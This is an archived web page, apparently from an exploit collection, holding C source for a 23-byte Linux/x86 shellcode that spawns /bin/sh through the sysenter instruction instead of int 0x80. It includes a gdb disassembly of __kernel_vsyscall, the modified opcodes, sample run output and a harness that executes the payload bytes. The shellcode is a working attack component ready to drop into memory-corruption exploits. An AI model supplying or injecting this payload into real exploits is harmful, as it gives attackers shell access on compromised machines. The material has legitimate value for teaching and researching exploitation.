<html><head><title>Linux/x86 - /bin/sh sysenter Opcode Array Payload - 23 Bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 lnx_binsh4.c - v1 - 23 Byte /bin/sh sysenter Opcode Array Payload
 Copyright(c) 2005 c0ntex &lt;c0ntex@open-security.org&gt;
 Copyright(c) 2005 BaCkSpAcE &lt;sinisa86@gmail.com&gt;

 This program is free software; you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation; either version 2 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program; if not, write to the Free Software
 Foundation, Inc., 59 Temple Place, Suite 330, Boston,
 MA  02111-1307  USA

*/

/*

Tested: fedora core 3 - c0ntex
	fedora core 4 - BaCkSpAcE
        debian SID - amnesia

execve(&quot;/bin/sh&quot;) using sysenter from __kernel_vsyscall appose to int $0x80

(gdb) disas __kernel_vsyscall
Dump of assembler code for function __kernel_vsyscall:
0xffffe400 &lt;__kernel_vsyscall+0&gt;:       push   %ecx
0xffffe401 &lt;__kernel_vsyscall+1&gt;:       push   %edx
0xffffe402 &lt;__kernel_vsyscall+2&gt;:       push   %ebp
0xffffe403 &lt;__kernel_vsyscall+3&gt;:       mov    %esp,%ebp
0xffffe405 &lt;__kernel_vsyscall+5&gt;:       sysenter
0xffffe407 &lt;__kernel_vsyscall+7&gt;:       nop
0xffffe408 &lt;__kernel_vsyscall+8&gt;:       nop
0xffffe409 &lt;__kernel_vsyscall+9&gt;:       nop
0xffffe40a &lt;__kernel_vsyscall+10&gt;:      nop
0xffffe40b &lt;__kernel_vsyscall+11&gt;:      nop
0xffffe40c &lt;__kernel_vsyscall+12&gt;:      nop
0xffffe40d &lt;__kernel_vsyscall+13&gt;:      nop
0xffffe40e &lt;__kernel_vsyscall+14&gt;:      jmp    0xffffe403 &lt;__kernel_vsyscall+3&gt;
0xffffe410 &lt;__kernel_vsyscall+16&gt;:      pop    %ebp
0xffffe411 &lt;__kernel_vsyscall+17&gt;:      pop    %edx
0xffffe412 &lt;__kernel_vsyscall+18&gt;:      pop    %ecx
0xffffe413 &lt;__kernel_vsyscall+19&gt;:      ret
0xffffe414 &lt;__kernel_vsyscall+20&gt;:      add    %al,(%eax)
0xffffe416 &lt;__kernel_vsyscall+22&gt;:      add    %al,(%eax)
0xffffe418 &lt;__kernel_vsyscall+24&gt;:      add    %al,(%eax)
0xffffe41a &lt;__kernel_vsyscall+26&gt;:      add    %al,(%eax)
0xffffe41c &lt;__kernel_vsyscall+28&gt;:      add    %al,(%eax)
0xffffe41e &lt;__kernel_vsyscall+30&gt;:      add    %al,(%eax)
End of assembler dump.
(gdb) q

so we replace

int $0x80

instruction with

push   %ecx
push   %edx
push   %ebp
mov    %esp,%ebp
sysenter

which does make the shellcode slightly larger  :/


 804807a:       51                      push   %ecx
 804807b:       52                      push   %edx
 804807c:       55                      push   %ebp
 804807d:       89 e5                   mov    %esp,%ebp
 804807f:       0f 34                   sysenter

 $ ./lnx_binsh4

 [-] Stack Pointer found -&gt; [0xbfe0f0d8]
         [-] Size of payload egg -&gt; [23]
	 [-] Payload Begin -&gt; [0x80496c0]
	 [-] Payload End   -&gt; [0x80496d7]

 sh-3.00b$

*/

/*
 Calling: execve(/bin/sh), exit(0)
*/


#include &lt;stdio.h&gt;

typedef char wikkid;

/* reduced shellcode size from 45 to 23 - BaCkSpAcE */
wikkid oPc0d3z[] = &quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f&quot;
                   &quot;\x73\x68\x68\x2f\x62\x69\x6e\x54&quot;
                   &quot;\x5b\x52\x53\x54\x59\x0f\x34&quot;;

unsigned long grab_esp()
{
		__asm__(&quot;movl %esp,%eax&quot;);
}

int main(void)
{
	unsigned long delta;
	void (*pointer)();

	delta = grab_esp();

	fprintf(stderr, &quot;\n[-] Stack Pointer found -&gt; [0x%x]\n&quot;, delta);
	fprintf(stderr, &quot;\t[-] Size of payload egg -&gt; [%d]\n&quot;, sizeof(oPc0d3z)-1);

	pointer=(void*)&amp;oPc0d3z;

	while(pointer) {
		fprintf(stderr, &quot;\t[-] Payload Begin -&gt; [0x%x]\n&quot;, pointer);
		fprintf(stderr, &quot;\t[-] Payload End   -&gt; [0x%x]\n\n&quot;, pointer+23);
		pointer();
	}

	_exit(0);
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
